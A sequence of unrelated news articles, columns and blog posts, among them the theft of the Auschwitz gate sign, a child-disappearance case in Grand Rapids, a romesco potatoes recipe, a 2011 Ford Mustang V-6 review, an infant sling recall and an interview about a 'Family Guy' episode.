" The theft of such a symbolic object is an attack on the memory of the Holocaust , and an escalation from those elements that would like to return us to darker days , " said Avner Shalev from the Yad Vashem memorial centre in Jerusalem .
" I call on all enlightened forces in the world who fight against anti-Semitism , racism , xenophobia and the hatred of the other to join together to combat these trends . "
In Brussels , European Parliament President Jerzy Buzek , a former Polish prime minister , appealed to the thieves to return the sign .
" Give it back out of respect for the suffering of over a million victims , murdered in this Nazi camp , the biggest cemetery of humankind , " he said .
Metal bars cut
The wrought - iron sign was half - unscrewed , half - torn off from above the death camp 's gate between 0330 and 0500 on Friday , said a police spokeswoman .
HISTORY OF AUSCHWITZ SIGN Made by Polish political prisoners in 1940 Letter ' B ' thought to have been reversed as act of defiance - making it appear upside - down Locals say Red Army soldiers were bribed to leave it in Poland after camp was liberated Occasionally replaced by replica while conservation work is done
Audio - slideshow : Auschwitz decay Investigators say at least two people would have been needed to steal the 5 - m ( 16 - ft ) , 40 - kg ( 90 - lb ) sign .
Police said they were reviewing footage from a surveillance camera that overlooks the entrance gate and the road beyond but declined to say whether the crime was recorded , The Associated Press news agency reports .
Auschwitz museum spokesman Jaroslaw Mensfelt said it might have been too dark for the camera to have captured images .
He said the thieves apparently carried the sign 300 m ( yards ) to an opening in a concrete wall .
The opening was left intentionally to preserve a poplar tree dating back to the time of World War II .
Four metal bars that had blocked the opening had been cut and footprints in the snow led from the wall opening to the nearby road , where police presume the sign was loaded on to a vehicle .
Another police official said earlier that while all leads were being considered , police were focusing on a theft ordered by a private collector or a group of individuals .
It is the first time the sign , made by Polish prisoners , has been stolen since it was erected in 1940 .
A 5,000 - zloty ( $ 1,700 ; £ 1,050 ) reward has been offered for information leading to the capture of the thieves .
Auschwitz , which receives more than a million visitors a year , has been run as a state museum since 1947 .
Germany recently pledged 60 m euros ( $ 86 m ) to an endowment fund to help preserve the camp .

GRAND RAPIDS --
After a frantic week filled with worry and tragedy , the unsettling case surrounding the disappearance of 2 - year - old Jozlynn Martinez is in a seeming state of suspended animation .
In a West Side home , Jozlynn 's young mother , Consuela Martinez , clings to a shred of hope that her daughter is alive despite what police say , based on the alleged statements of Jeffrey Malmberg .
Malmberg , 40 , remains in a Kent County Jail cell charged with kidnapping the girl .
He sticks to his story to police that Jozlynn died inside the home Monday night , and he inexplicably disposed of her body in a trash Dumpster Tuesday not far from her crib housed on Nagold Street NW before fleeing to Lansing .
More than 70 Grand Rapids Police Department personnel combed through a virtual mountain of trash taken from Dumpsters in the area but found nothing -- leaving open the possibility that the contents of the dumpster where he may have put the toddler were processed through the county 's trash incinerator .
COMPLETE COVERAGE
Complete coverage of the disappearnce of Jozlynn Martinez
Grand Rapids police continue to investigate Malmberg 's claims but have finished searching the trash , Lt. Ralph Mason said .
" We wo n't quit until we get a resolution , " Mason said Sunday of the department 's investigation .
" If we get information that leads somewhere , we will pursue it . "
Martinez continues to hope against hope that her daughter lives .
She has a 7 - month - old son -- born as a result of her relationship with the homeless Malmberg , who is currently in state custody .
The 21 - year - old wants to see the Amber Alert reinstated for her 2 - year - old but , after a frustrating jailhouse meeting with Malmberg Saturday night , she is less anxious to deal with the media .
Martinez filled in the story Sunday saying Malmberg claimed the child fell down the stairs and he " panicked " and instead of calling for help , he placed the baby in a trash bin .
She said she wants to believe her daughter is alive but does n't know why Malmberg would be leading the police on some kind of wild goose chase .
" He 's been telling the same story every time , " said Martinez .
" I have no clue . "
In the meantime , the biological father of Jozlynn , John Mark Rittenhouse , is making his way to Michigan from Arizona , where he has been living for a short time , according to a friend of Rittenhouse there .

The companion , Robin Thoen , also has been told her services photographing public meetings and potential building locations are no longer required .
Meanwhile , the TTC wants to strengthen controls over consultants to prevent this sort of thing from happening again .
" We acknowledge there was a conflict of interest that should have been declared , " said TTC spokesman Brad Ross .
" We are reviewing our policies now and also doing a broad scope audit ( of contracts Cursio oversaw ) . "
Ross confirmed Monday that Cursio is no longer an employee of the TTC , but said he could not discuss the circumstances because it is a " personnel matter . "
Cursio was the project manager overseeing the design of three large " carhouses , " part of an expansion of the TTC 's fleet .
The TTC is paying consultant AECOM Canada $ 8 million to do the design and Cursio's job was to manage AECOM 's work , approving sub - consultants and invoices .
The Star reported Sunday that Cursio recommended that AECOM hire West Point Photography , a company owned and run by Thoen , his longtime female companion .
Cursio is married , but lived a double life , socializing with Thoen at her East York home and discussing renovation plans that turned a $ 230,000 house into a well - appointed $ 705,000 home she sold two years ago .
Cursio's adult daughter also worked for Thoen at West Point .
Recently ,
Thoen bought a new house , just over a kilometre from Cursio 's home in Etobicoke .
Since May of last year , Cursio approved payments of at least $ 50,000 in public money from AECOM to West Point .
Thoen , an amateur photographer , took photographs of people at public meetings , rankling ratepayers who felt their privacy was invaded at one recent session .
Thoen also took photographs of streetscapes where new streetcar lines are planned .
There was no contract between AECOM and West Point , just payments .
The TTC said Cursio never should have recommended Thoen for the job .
Cursio is a former senior civil servant who was a vice - president at the Ontario Realty Corp. until he abruptly left in 2007 .
The TTC hired him in 2008 .
His online resume states that , while at the province - owned ORC , he " directed the sourcing and procurement of external consulting expertise provided by third party contractors and design consultants . "
He met Thoen during his time at the ORC .
The Cursio - Thoen issue caused a stir at the TTC as officials realized two problems .
They have a strong conflict of interest policy but " it is only as good as the individual who is asked to adhere to it , " spokesman Ross said .
The other problem is that while they have strict policies over the choosing of a design consultant like AECOM ( a tendered job ) , they do n't have a strong policy over TTC staff recommending sub-consultants to companies like AECOM .
" We are looking at this and we may need to strengthen our policies , " Ross said .
Auditors at the TTC are now reviewing all billings that came across Cursio 's desk in the almost two years he worked for the transit commission .
The TTC is also this week reminding all staff of its conflict of interest policy , which instructs employees that they are " expected to conduct themselves with personal integrity , ethics , honesty and diligence . "
Employees who are in a conflict must declare it , and remove themselves from the conflict .
As for Thoen 's company , Ross said , " We have asked AECOM that the relationship with West Point Photography be severed . "
AECOM spokeswoman Laura Soucek would only say , " We have suspended the use of West Point until ( the TTC ) has completed their review of the situation . "
Neither Cursio or Thoen was available for comment Monday .
A woman who answered the phone at his matrimonial home said she would take a message .

Meet my new favorite potato dish .
Oh , those mustard - roasted potatoes were wonderful , were n’t they ?
And who does n’t love baked pommes frites ?
And latkes , they were a force to be reckoned with .
But they ’re dead to me , or they would be , if in some cruel parallel universe I was to choose only one way to eat potatoes from this day forth .
I should have made this years ago , when my friend Luisa got all adorably shouty over them —
“ Roasted and raw garlic !
Toasted nuts !
Fried bread !
Mellow thyme !
Hot chiles !
Creamy potatoes ! ” I have the cookbook , and I ’ve yet to make a recipe from it that did not blow my already Goin - obsessed mind .
But it took me until that aforementioned tapas party to put those chile peppers , hazelnuts , almonds , fried bread and herbs together in a blender .
I blame the 1 1/4 cups of olive oil .
I mean , I ’m sure not fat - phobic but that there , it is a lot .
But what it makes is a sauce that you stir into those lucky , lucky tubers , and it yields twice the volume that you even need for the potatoes ( but please do n’t halve the recipe , you will regret it as it is as good on these potatoes as it is on meat , fish and your spoon , sneaking tastes ) .
And what is this here romesco of which I swoon ?
It is splendid .
Chiles ( which manage , astoundingly , not to be so much Tabasco - hot , but punchy and bright ) , a piece of fried bread , peeled tomatoes , garlic , thyme , almonds and hazelnuts are ground with olive oil and the result is , regretfully , like nothing I have ever had before .
Busy , loud and hearty , it could be the New Yorker of sauces , um , were it not actually Catalan .
Nevertheless , it can escape to here anytime .
This week :
We ’re on a boat !
Thus , comment responses will be slow and spotty .
But fear not , new recipes will magically appear as we work through my cooking backlog .
See ?
Everybody wins !

Romesco Potatoes
Adapted from Sunday Suppers at Lucques , the potatoes more generously adapted than the sauce
Romesco Sauce
5 ancho chiles *
2 tablespoons raw almonds
2 tablespoons blanched hazelnuts ( or , you can rub their skins off once they are toasted and cooled )
1 1/4 cups extra-virgin olive oil
1 slice country bread , about 1 - inch thick
1/3 cup canned San Marzano tomatoes ( I bought whole tomatoes , not sure why ; I ’d use purée next time )
1 clove garlic , chopped
1 tablespoon chopped flat - leaf parsley
1/2 lemon , for juicing
A splash of sherry vinegar ( ca n’t find it ?
Use a mild wine or balsamic vinegar instead )
Kosher salt
Potatoes
1 1/2 pounds Yukon Gold potatoes ( full size or minis work )
1/4 cup extra virgin olive oil
4 to 5 cloves garlic , unpeeled
2 bay leaves
6 springs thyme , plus 2 teaspoons thyme leaves ( I left this out , accidentally ; it was fine without it )
1 cup Romesco sauce ( from above )
2 tablespoons chopped flat - leaf parsley
Kosher salt and freshly ground black pepper
Make the sauce : Preheat the oven to 375 °F .
Remove and discard the seeds and stems from the chiles , then soak them in warm water for 15 minutes to soften .
Strain the chiles , and pat dry with paper towels .
Meanwhile , spread the nuts on a baking sheet and toast for 8 to 10 minutes , until they smell nutty and are golden brown .
Heat a large sauté pan over high heat for 2 minutes .
Add 2 tablespoon olive oil , wait a moment ( for it to heat ) and fry the slice of bread on both sides until golden brown .
Remove the bread from the pan and cool .
Cut it into 1 - inch cubes and set aside .
Return the pan to the stove over high heat .
Add 2 tablespoon olive oil and the chiles and sauté for a minute or two .
Add the tomatoes .
Season with 1 /2 teaspoon salt and cook for 2 to 3 minutes , stirring often until the tomato juices have evaporated .
Turn off the heat and leave the mixture in the pan .
In a food processor , pulse together the toasted nuts , garlic and fried bread until the bread and nuts are coarsely ground .
Add the chile - tomato mixture and process for 1 minute more .
With the machine running , slowly pour in the remaining 1 cup of olive oil and process until you have a smooth purée .
Do n’t worry , the romesco will “ break ” ( separate into solids and oil ) ; this is normal .
Add the parsley , season to taste with lemon juice , sherry vinegar and more salt , if you feel it needs it .
Make the potatoes :
Place the potatoes in a roasting pan ( I used my 12 - inch cast iron skillet , which turned out to be a brilliant idea as I could transfer it to the stove and continue cooking there — highly recommended if you have one ) and toss well with 2 tablespoons olive oil , garlic cloves , bay leaves , thyme sprigs and a heaping teaspoon of salt .
Cover tightly with aluminum foil and roast the potatoes until tender when pierced ( this took 30 minutes for my tiny ones , larger ones may need 50 ) .
Discard the bay and thyme and squeeze the garlic out of its skin and set aside .
Either transfer potatoes to a large sauté pan or transfer cast iron skillet to stove - top and heat on high for 2 minutes .
Pour in the remaining 2 tablespoons oil ( you can get away with 1 tablespoon if you are using the same cast - iron you roasted the potatoes in and it is well seasoned ) turn the heat to medium - high and wait 1 minute more .
Add the potatoes and smash them with your spatula or a fork until a little broken up .
Season with thyme leaves , salt and pepper and sauté them for 6 to 8 minutes until they are crispy on one side .
( If they are stuck to the pan , do n’t try to move them , they will eventually release themselves ) .
After they ’ve browned nicely on the first side , turn them until they color on all sides .
Spoon the romesco sauce and reserved garlic over the potatoes and stir .
Toss in the parsley .
Adjust seasoning if necessary .
Do ahead : Sauce can be made up to 2 weeks in advance and kept in the fridge .
Use the extra on sandwiches , with cheese , eggs , grilled fish and roasted meats .
One the dish is assembled , if you ’re not ready to serve it yet , turn off the heat and leave the potatoes in the pan ; just before serving reheat for a few minutes and add the parsley at the last minute .
* Guys , I ’m chile clueless .
It ’s pathetic .
Kitchen Market — stocking everything , knowing all — once helped me hide this fact from the public , but in their absence , left to fend for myself , I was only able to find something called New Mexico Red Chiles and you do n’t want to know how long ( very ) I spent trying to figure out whether they were hotter or less hot or bigger or smaller than the chiles I was supposed to use .
I ended up using 3 instead of 5 , and regretting it as the sauce could have had 5 without being more than just moderately hot .

Several Houston charities — including the Salvation Army and a group affiliated with the Houston Fire Department — are demanding proof that needy children are n't illegal immigrants before giving them free Christmas toys .
Parents will need to supply their children 's birth certificates or prove that at least either Mom or Dad is here legally .
Though the Salvation Army says it 's just trying to prevent fraud , immigration activists are incensed .
Are the charities ' policies smart or fundamentally uncharitable ?
Do n't punish kids for their parents ' crimes :
These charities say their point is n't to punish the children , says Matthew Yglesias at Think Progress , but that 's exactly what they 're doing .
Granted , the parents should n't have come to the U.S. without legal permission .
But people should n't steal either , and the Salvation Army is n't telling kids they can't have toys if their parents are burglars .
" Toy drives checking immigration status of children "
Do n't punish citizens for the sake of illegal immigrants : " There are too few toys and too many needy children , " says 24ahead.com .
So giving a toy to an illegal immigrant means taking one away from a needy American boy or girl .
If the immigration activists want to help , they should discourage people from entering the U.S. illegally and using up our limited resources .
" Matt Yglesias supports taking toys from needy U.S. children ; unable to understand limited resources "
Everyone should be welcome for the holidays : Sure , it has been " a tough financial year , " says Katie Powalski in the Orlando Sentinel .
But , come on !
It 's Christmas .
" Are n't the holidays supposed to be for the kids ? "
There are ways to make political points without trampling " the holiday spirit of generosity . "
" Immigration check for charity Christmas toys "
The Unpersuadables
In fighting for science , we subscribe to a comforting illusion : that people can be swayed by the facts .
By George Monbiot .
Published in the Guardian 9th March 2010 .
There is one question that no one who denies manmade climate change wants to answer : what would it take to persuade you ?
In most cases the answer seems to be nothing .
No level of evidence can shake the growing belief that climate science is a giant conspiracy codded up by boffins and governments to tax and control us .
The new study by the Met Office , which paints an even grimmer picture than the Intergovernmental Panel on Climate Change ( 1 ) , will do nothing to change this view .
The attack on climate scientists is now widening to an all - out war on science .
Writing recently for the Telegraph , the columnist Gerald Warner dismissed scientists as “ white - coated prima donnas and narcissists … pointy - heads in lab coats [ who ] have reassumed the role of mad cranks …
The public is no longer in awe of scientists .
Like squabbling evangelical churches in the 19th century , they can form as many schismatic sects as they like , nobody is listening to them any more . ” ( 2 )
Views like this can be explained partly as the revenge of the humanities students .
There is scarcely an editor or executive in any major media company – and precious few journalists – with a science degree , yet everyone knows that the anoraks are taking over the world .
But the problem is compounded by complexity .
Arthur C Clarke remarked that “ any sufficiently advanced technology is indistinguishable from magic ” ( 3 ) .
He might have added that any sufficiently advanced expertise is indistinguishable from gobbledegook .
Scientific specialisation is now so extreme that even people studying neighbouring subjects within the same discipline can no longer understand each other .
The detail of modern science is incomprehensible to almost everyone , which means that we have to take what scientists say on trust .
Yet science tells us to trust nothing ; to believe only what can be demonstrated .
This contradiction is fatal to public confidence .
Distrust has been multiplied by the publishers of scientific journals , whose monopolistic practices make the supermarkets look like angels , and which are long overdue for a referral to the Competition Commission .
They pay nothing for most of the material they publish , yet , unless you are attached to an academic institute , they ’ll charge you £ 20 or more for access to a single article .
In some cases they charge libraries tens of thousands for an annual subscription .
If scientists want people at least to try to understand their work , they should raise a full - scale revolt against the journals which publish them .
It is no longer acceptable for the guardians of knowledge to behave like 19th - Century gamekeepers , chasing the proles out of the grand estates .
But there ’s a deeper suspicion here as well .
Popular mythology – from Faust through Frankenstein to Dr No – casts scientists as sinister schemers , harnessing the dark arts to further their diabolical powers .
Sometimes this is n’t far from the truth .
Some use their genius to weaponise anthrax for the US and Russian governments .
Some isolate terminator genes for biotech companies , to prevent farmers from saving their own seed .
Some lend their names to articles ghostwritten by pharmaceutical companies , which mislead doctors about the drugs they sell ( 4 ) .
Until there is a global code of practice or a Hippocratic oath binding scientists to do no harm , the reputation of science will be dragged through the dirt by researchers who devise new means of hurting us .
Yesterday in the Guardian Peter Preston called for a prophet to lead us out of the wilderness .
“ We need one passionate , persuasive scientist who can connect and convince … We need to be taught to believe by a true believer ” ( 5 ) .
Would it work ?
No . Look at the hatred and derision the passionate and persuasive Al Gore attracts .
The problem is not only that most climate scientists can speak no recognisable human language , but also the expectation that people are amenable to persuasion .
In 2008 the Washington Post summarised recent psychological research on misinformation ( 6 ) .
This shows that in some cases debunking a false story can increase the number of people who believe it .
In one study , 34 % of conservatives who were told about the Bush government ’s claims that Iraq had weapons of mass destruction were inclined to believe them .
But among those who were shown that the government ’s claims were later comprehensively refuted by the Duelfer report , 64 % ended up believing that Iraq had WMD .
There ’s a possible explanation in an article published by Nature in January ( 7 ) .
It shows that people tend to “ take their cue about what they should feel , and hence believe , from the cheers and boos of the home crowd . ”
Those who see themselves as individualists and those who respect authority , for example , “ tend to dismiss evidence of environmental risks , because the widespread acceptance of such evidence would lead to restrictions on commerce and industry , activities they admire . ”
Those with more egalitarian values are “ more inclined to believe that such activities pose unacceptable risks and should be restricted . ”
These divisions , researchers have found , are better at explaining different responses to information than any other factor : race , gender , class , income , education or personality type .
Our ideological filters encourage us to interpret new evidence in ways that reinforce our beliefs .
“ As a result , groups with opposing values often become more polarized , not less , when exposed to scientifically sound information . ” (8 ) The conservatives in the Iraq experiment might have reacted against something they associated with the Duelfer report , rather than the information it contained .
While this analysis rings true , the description of where the dividing line lies is n’t quite right .
It does n’t describe the odd position in which I find myself .
Despite my iconoclastic , anti-corporate instincts , I now spend much of my time defending the scientific establishment from attacks by the kind of rabble - rousers with whom I usually associate .
My heart rebels against this project : I would rather be pelting scientists with eggs than trying to understand their datasets .
But my beliefs oblige me to try to make sense of the science and to explain its implications .
This turns out to be the most divisive project I ’ve ever engaged in .
The more I stick to the facts , the more virulent the abuse becomes .
This does n’t bother me – I have a hide like a glyptodon – but it reinforces the disturbing possibility that nothing works .
The research discussed in the Nature paper shows that when scientists dress soberly , shave off their beards and give their papers conservative titles , they can reach across to the other side .
But in doing so they will surely alienate people who would otherwise be inclined to trust them .
As the MMR saga shows , people who mistrust authority are just as likely to kick against science as those who respect it .
Perhaps we have to accept that there is no simple solution to public disbelief in science .
The battle over climate change suggests that the more clearly you spell the problem out , the more you turn people away .
If they do n’t want to know , nothing and no one will reach them .
There goes my life ’s work .

Starting at less than $ 23,000 , the new 2011 Ford Mustang V - 6 is , surprisingly , one of the best bang - for - the - buck performance coupes .
We 're surprised here , because the Mustang V - 6 has never been a very pulse - raising drive , rather the option for those who want the look but do n't care much about the performance .
Baby Boomers far and wide are going to first think “ secretary ’s car ” with respect to a base - model Mustang .
To others , it 's known as one of the cruiser - convertible standbys at rental - car outlets .
But especially with the standard six - speed manual gearbox the 2011 Ford Mustang V - 6 is truly satisfying to drive — and exciting .
When you nail the accelerator , there 's enough thrust to really pin you back in your seat in any of the lower gears , and the rear wheels really want to break loose in first or second gear .
The Mustang V - 6's 305 horsepower and 280 pound - feet of torque are cause to rejoice .
That 's an astonishing 95 hp more than last year 's V - 6 ( and 40 lb - ft more ) .
Yet the new engine gets considerably better fuel economy to boot — 19 mpg city , 31 highway with the six - speed automatic transmission , 19/29 with the six - speed manual .
In a weeklong drive of the 2010 Ford Mustang V - 6 last summer , this editor found the well - past - its - prime SOHC Cologne V - 6 ( the same engine that 's in the Explorer and Ranger ) to be the weak link in the base Mustang package .
The old engine was adequately torquey provided you were very leisurely cruising around , but as soon as you put your right foot into it the V - 6 did n’t feel particularly strong , smooth , or refined .
Horsepower up 95 ... and up to 31 mpg highway
While its 305 hp is an astonishing 95 hp higher than last year 's engine , the Mustang 's peak torque is only 40 lb- ft higher than before — achieved at 4250 rpm rather than 3500 rpm — but it feels stronger than that .
The new engine feels like it has a fatter torque curve , and stick it out in any gear and it builds to a frenzy as it nears its 7,000 - rpm redline — in a way that would have been unheard of in the past for a six - cylinder pony car .
And in real - world driving , the engine seems quite efficient ; in some very spirited driving on two - lane canyon roads with a manual transmission , we averaged a very respectable 23 mpg according to the trip computer .
Just last year Ford introduced a set of major improvements on the Mustang and extensively redesigned its exterior , giving it a more aggressive look while at the same time making the exterior proportions a little tidier and leaner .
Even though it kept the old solid - axle rear setup , the Mustang 's suspension was also extensively redone and we noted that it took a plant more easily into corners , and dealt much better with choppy pavement and mixed surfaces .
The new look and the improvements are carried over mostly untouched for 2011 , but a number of new features alter — for the better , as we experienced — the way in which the Mustang responds and feels to the driver .
The first of those is the incorporation of Ford ’s EPAS electric power steering system
Electric power steering , stronger brakes
In the Mustang , EPAS does n’t have that uneasy , twitchy feeling on center that so many units do .
You can track straight ahead in a relaxed way without making small adjustments all the time , and the system even corrects for the crown of the road or crosswinds .
Ford adds that damper tuning and spring rates were again revised for the new setup , while new rear lower control arms and stiffer stabilizer bar bushings help cornering stability .
And notably , brakes have been upgraded on V - 6 Mustangs .
There are a few packaging and equipment issues though .
There 's no telescopic steering - wheel adjustment , Sync , surprisingly , still is n’t available at all on base - model Mustangs .
The voice - activated navigation feature is n’t optional on the base model either .
And we find pedal placement on automatic - transmission models odd , with the brake pedal several inches higher than the gas .
Though the Mustang Convertible remains nice , casual fun in V - 6 form for those who want to take in the summer breeze , enthusiasts who are looking at the V - 6 should definitely opt for the Coupe .
Although we did n't note any pronounced cowl shake in the Convertible ( the feeling that seat and windshield are shaking at different rates ) , we noted a difference in the way the Coupe and Convertible handled , especially over jiggly surfaces , and a nearly identical center - console creak over some of the roughest surfaces , present in both convertibles we drove .
Stick with the stick , unless you 're cruising
Those who enjoy driving fast on curvy roads will also want to steer away from the automatic transmission .
In the automatic model in top gear , the tach is well below 2,000 rpm , additionally , the transmission is programmed to lug up to the highest possible gear a few moments after you ease off the gas at any speed .
That can create a little bit of hesitation as you reaccelerate from a sharp right turn , but again the plentiful torque saves the day .
That 's okay , but what really bugged us is that there 's no way of downshifting to a particular gear ; in what sounded like a cost concession after talking to a few Ford officials , the Mustang has no paddle shifters and no manumatic shift gate .
Instead , the selector for this six - speed reads " PRND321 " — which left us wondering what happens when you 're in one of the upper gears and want a downshift .
A Ford powertrain official explained that going from D to 3 will command a downshift to one gear lower than what you 're currently in , but throttle input can have a role as well .
Otherwise , the transmission includes a " grade assist " hill mode that helps hold lower gears longer and downshifts more readily for accelerator and brake inputs , but we would have rather had a way of manual selecting the gears .
The point this leads to is something that could n't have been said before : that the V - 6 now makes sense as an exciting enthusiast package on a budget .
A new performance bargain benchmark ?
Ford was so confident in this that at a launch event attended by TheCarConnection.com it made available a Camaro LT V - 6 and let us compare it with the Mustang on an autocross course .
The Camaro ’s turn - in felt squishier overall , with more excess body motion than the Mustang , with the most significant difference felt in quick transitions .
In all fairness , the Mustangs Ford brought to that had the new V - 6 Performance Package , which adds the 3.31 performance axle ratio , Pirelli summer performance tires on unique 19 - inch wheels , plus Mustang GT suspension and braking upgrades .
The whole package will be available beginning late summer .
The new Mustang V - 6 is very satisfying to drive in every way but one : sound .
Though it 's clear Ford has labored to give it a good exhaust note when revved ( from the outside especially ) , it still sounds like a typical V - 6 when you 're inside the car , with more airy intake sounds than you might expect .
Sound aside , this reviewer would be hard - pressed to tell you outright which would be faster : the new V - 6 or a V - 8 - powered GT of about a decade ago .
The throttle response , the plentiful low - end torque , it ’s all there .
And thanks to Ford 's TI - VCT variable valve timing , the V - 6 builds steam all the way through its range in a way the old V - 8 did n't .
Speaking of V - 8s , you 'll also want to read our First Drive of the 2011 Ford Mustang GT to hear about what an extra 107 horsepower can do .
Especially when you size up the fuel economy figures , and consider that both of the Coupes we drove bottom - lined in the $ 30 k vicinity or less , the Mustang V - 6 quite simply exceeds expectations .
In a column a few days back making the argument that Europe 's economy " bears little resemblance " to U.S. caricatures of " a stagnant economy in which high taxes and generous social benefits have undermined incentives , stalling growth and innovation , " Paul Krugman plays the eyeball card :
Actually , Europe 's economic success should be obvious even without statistics .
For those Americans who have visited Paris : did it look poor and backward ?
What about Frankfurt or London ?
You should always bear in mind that when the question is which to believe — official economic statistics or your own lying eyes — the eyes have it .
Hey , I can play that game !
I was in France as recently as last week , and took a look around as well .
Here 's what I saw :
* Lots of beautiful old buildings , stylish people , elegantly designed bridges , and fancy restaurants offering delicious food !
* Craploads of ugly graffiti , including on some of the aforementioned beautiful old buildings .
* Lots of drunk homeless people , including in the front hallway of the beautiful old building where I stayed .
* Shops closed , often by government diktat , precisely when you might want to frequent them–during lunchtime , say ; or a dinner - only restaurant at 6:59 p.m .
* Routine splotches of dogshit on the sidewalks ( though in fairness , the trendlines are going in the right direction on this one ) .
* Clotheslines galore , since very few people seem to
own dryers .
* Clear majorities among the people I know whose salaries are paid by the state .
* Permanent double - digit unemployment among young people who wish to find work .
* Salaries so low that a full - time teacher I know who commutes from Switzerland makes less in Euros than the Swiss minimum wage .
* Did I mention that French people are considered ( according to one source ) as " the Mexicans of Switzerland , " soaking up all the menial jobs , being blamed for corroding the culture , and otherwise treated like Polish plumbers ?
* Little to zero in detectable entrepreneurial activity or spirit .
No , France is not " poor and backward , " though none but those constructed from straw would ever say so .
Nor does anybody seriously say , as Krugman contends , that " European - style social democracy should be an utter disaster . "
But one thing you can count on for sure : Neither Krugman nor the Euro - bashers he 's shadowboxing here are likely to point out that fully half of the world 's privatization in the 1990s took place in … Western Europe !
Thanks in part to the very " dogma " that Krugman aims to vanquish .
Oh well .
A WOMAN'S joy at finally being reunited with her long lost father , aged 65 , turned to horror when he raped her .
The once estranged pair met after being separated for 38 years on a Spanish reality television program called El Diario de Patricia ( Patricia ’s Diary ) .
The show specialises in personal issues such as exposing family secrets or scandals , relationship breakdowns and organising surprise family reunions live on air .
The father , who appeared like a normal , loving parent , appealed to TV viewers saying he had n't seen his daughters since 1966 after splitting with their mother .
His heartfelt plea to find his two daughters struck a chord with both viewers and the younger daughter who happened to see the program when it aired in 2003 .
The daughter contacted her father by phone but after they met in person the first time he kissed her on the lips .
For some unknown reason , the pair then went back to her home where he sexually abused her .
The confused and traumatised woman , who 'd grown up scarred by not having a father , was reported to have been repeatedly sexually abused by the father , the court heard .
After several more meetings where further sexual abuse occurred , he eventually raped her .
However , the court also heard that the daughter 's psychiatric report stated she had endured a lifetime " lack of support " which meant she did n't cope with the situation in a normal way .
A court in Malaga yesterday jailed the father for seven years .

Owners of SlingRiders were asked to stop using them immediately More than 1 m baby slings made by Californian company Infantino are being recalled in the US and Canada after reports of three deaths involving them .
US and Canadian consumer watchdogs announced the recall along with Infantino of two infant carriers , the SlingRider and Wendy Bellissimo .
The US Consumer Product Safety Commission said it was aware of three deaths in slings reported last year .
A free voluntary replacement programme has been announced .
One million infant slings were being recalled in the US and 15,000 in Canada , the US CPSC said in its statement .
" CPSC advises consumers to immediately stop using these slings for infants younger than four months of age due to a risk of suffocation and contact Infantino for a free replacement product , " it said .
The CPSC was , it added , " aware of three reports of deaths that occurred in these slings in 2009 " .
It said these involved an infant of seven weeks in Philadelphia , an infant of six days in Salem and an infant of three months in Cincinnati .
' Close co-operation '
In a statement on his company 's website , Infantino president Jack Vresics said the recall was being announced to " address concerns raised " by the CPSC .
The sling 's fabric can press against an infant 's nose and mouth , blocking the baby 's breathing and rapidly suffocating a baby within a minute or two
US Consumer Product Safety Commission
warning issued on 12 March " Our top priority is the safety of infants whose parents and caregivers use our products , " he said .
Mr Vresics said the San Diego - based company would co-operate " closely with CPSC as it continues its investigation of all baby slings " .
It would offer , he added , a free replacement baby carrier , activity gym or shopping cart cover to any affected consumer .
Earlier in March , the CPSC issued a broad warning about sling - style baby carriers , saying they posed a potential suffocation risk to infants , especially babies under four months .
It did not single out a specific type of sling or manufacturer .
" In the first few months of life , babies cannot control their heads because of weak neck muscles , " that warning said .
" The sling 's fabric can press against an infant 's nose and mouth , blocking the baby 's breathing and rapidly suffocating a baby within a minute or two .
" Additionally , where a sling keeps the infant in a curled position bending the chin toward the chest , the airways can be restricted , limiting the oxygen supply .
The baby will not be able to cry for help and can slowly suffocate . "
Babies who had a low birth weight , were born prematurely or had breathing problems such as colds were also at risk , the US watchdog noted .
In the earlier warning , it said it had identified or was investigating at least 14 deaths in the last 20 years associated with baby slings .

Since it was shown on Sunday , an episode of the Fox animated comedy “ Family Guy ” has drawn the repeated condemnation of Sarah Palin , the former Republican governor of Alaska and 2008 vice - presidential nominee .
In the episode , the teenage character Chris dates a girl named Ellen , who has Down syndrome , and who tells him over dinner that her mother is “ the former governor of Alaska . ”
Ms. Palin , whose son Trig also has Down syndrome , has said that the “ Family Guy ” show “ really is n’t funny ” and was the work of “ cruel , cold - hearted people . ”
Ms. Palin ’s daughter Bristol has written that the “ Family Guy ” writers were “ mocking my brother and my family , ” and called them “ heartless jerks . ”
One person who supports the “ Family Guy ” staff is Andrea Fay Friedman , the 39 - year - old actor and public speaker who played Ellen in that episode .
Like the character , Ms. Friedman also has Down syndrome .
In an e-mail message sent on Thursday to The New York Times , Ms. Friedman wrote :
I guess former Governor Palin does not have a sense of humor .
I thought the line “ I am the daughter of the former governor of Alaska ” was very funny .
I think the word is “ sarcasm . ”
In my family we think laughing is good .
My parents raised me to have a sense of humor and to live a normal life .
Ms. Friedman also spoke by phone with ArtsBeat about her “ Family Guy ” episode and the controversy that followed .
These are excerpts from that conversation .
Q .
How did you start out as an actor ?
A .
Before I did “ Family Guy , ” I started studying at the Santa Monica Playhouse when I was 14 , and then I also studied at the Stagecoach .
And then I did more acting at Santa Monica College .
My biggest break was “ Life Goes On , ” when I was 21 .
Q .
How were you hired to do this episode of “ Family Guy ” ?
A .
“ Family Guy ” talked to my dad first , before I knew about “ Family Guy , ” because I never watched it .
But since I ’m watching it , it ’s really funny .
They told me I was going to be animated , they were going to draw me , and I did not have to know the lines by memory .
I just had to read it .
It was really funny .
I enjoyed it .
I had a nice time doing it .
Q .
Did they specifically tell you that the character you were going to play also had Down syndrome ?
A .
Yeah , they told me I was playing Ellen , who was Miss Bossy .
I did n’t want to be bossy , but since they want me to be bossy , I just had to be as the character .
I had to be bossy , as part of my process .
That ’s the only way to transform the real me to an animated person .
So I had to do what an actor does .
I just wing it and have fun with it .
Q .
When you get asked to play characters who have Down syndrome , does that make you at all uncomfortable ?
A .
No , I ’m proud of it .
I ’m not embarrassed .
But mostly , it does n’t matter if you have Down syndrome .
Really , it just matters to have a different challenge .
Q .
When did you find out about the reaction that the episode elicited from Sarah Palin and her family ?
A .
[ laughs ]
That I did not even know about until my mom told me , “ You ’re on Channel 4 ! ”
And when I watched on Channel 4 , on “ Extra , ” and I saw Sarah Palin with her son Trig .
I ’m like , “ I ’m not Trig .
This is my life . ”
I was making fun of Sarah Palin , but not her son .
Q .
Do you agree with what she and her daughter Bristol were saying , that the character and the jokes were insulting to people with Down syndrome ?
A .
It ’s not really an insult .
I was doing my role , I ’m an actor .
I ’m entitled to say something .
It was really funny .
I was laughing at it .
I had a nice time doing voiceover .
It was my first time doing a voiceover , and I had fun .
Q .
Do you know what other acting roles you ’ve got coming up ?
A .
That I do n’t know .
[ laughs ]
No one asked me yet .
I ’m still waiting .
